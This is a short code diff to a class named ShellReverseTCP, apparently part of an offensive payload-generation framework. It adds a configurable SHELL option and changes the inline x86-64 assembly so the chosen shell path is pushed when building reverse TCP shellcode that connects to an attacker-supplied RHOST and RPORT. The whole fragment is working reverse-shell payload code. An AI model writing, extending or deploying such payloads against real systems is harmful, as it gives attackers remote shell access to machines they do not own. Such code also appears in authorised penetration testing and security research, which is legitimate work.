@@ -35,6 +35,11 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
         if 'RHOST' not in options and 'RPORT' not in options:
             return b''
 
+        if 'SHELL' in options:
+            shell = options['SHELL']
+        else:
+            shell = self.shells['sh']
+
         rhost = self.convert_host(options['RHOST'])
         rport = self.convert_port(options['RPORT'])
 
@@ -83,7 +88,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
             mov rax, r8
 
             xor rdx, rdx
-            mov r13, 0x{self.shell.hex()}
+            mov r13, 0x{shell.hex()}
             shr r13, 8
             push r13
             mov rdi, rsp
